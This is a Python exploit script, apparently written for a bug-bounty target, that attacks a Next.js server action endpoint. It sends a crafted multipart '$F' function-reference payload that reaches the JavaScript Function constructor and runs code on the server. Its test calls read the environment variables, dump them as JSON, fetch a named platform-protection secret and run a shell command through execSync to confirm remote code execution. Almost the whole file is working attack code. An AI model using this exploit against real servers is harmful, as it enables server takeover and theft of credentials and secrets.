#!/usr/bin/env python3
"""
Debug version with verbose output
"""

import requests
import json
import random
import string
import traceback

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"

def exploit_f_reference(code, desc=""):
    """
    $F Function Reference exploit with detailed logging
    """
    print(f"\n[*] Testing: {desc}")
    print(f"[*] Code: {code[:100]}...")

    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    payload_0 = f"$F1#{ACTION_ID}#constructor"
    payload_1 = {
        "constructor": {
            "constructor": code
        }
    }

    body = f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
    body += payload_0 + '\r\n'
    body += f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="1"\r\n\r\n'
    body += json.dumps(payload_1) + '\r\n'
    body += f'------{boundary}--\r\n'

    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': f'multipart/form-data; boundary=----{boundary}',
        'Accept': 'text/x-component',
        'User-Agent': 'Mozilla/5.0'
    }

    try:
        print("[+] Sending request...")
        response = requests.post(TARGET, data=body, headers=headers, timeout=20)
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Headers: {dict(response.headers)}")
        print(f"[+] Response length: {len(response.text)}")
        print(f"[+] Response: {response.text}")
        return response
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return None
    except Exception as e:
        print(f"[-] Error: {type(e).__name__}: {e}")
        traceback.print_exc()
        return None

print("="*70)
print("Debug Exploitation")
print("="*70)

# Test 1: Simple string return
exploit_f_reference("'test123'", "Simple string return")

# Test 2: Access process.env
exploit_f_reference("process.env.VERCEL_PLATFORM_PROTECTION || 'not found'", "Direct env access")

# Test 3: Return entire process.env as string
exploit_f_reference("JSON.stringify(process.env).substring(0, 1000)", "Env vars JSON")

# Test 4: Check if env var exists
exploit_f_reference("'VERCEL_PLATFORM_PROTECTION' in process.env ? process.env.VERCEL_PLATFORM_PROTECTION : 'missing'", "Conditional check")

# Test 5: Try with execSync to confirm RCE
exploit_f_reference("require('child_process').execSync('echo SUCCESS').toString()", "Echo test")

print("\n" + "="*70)
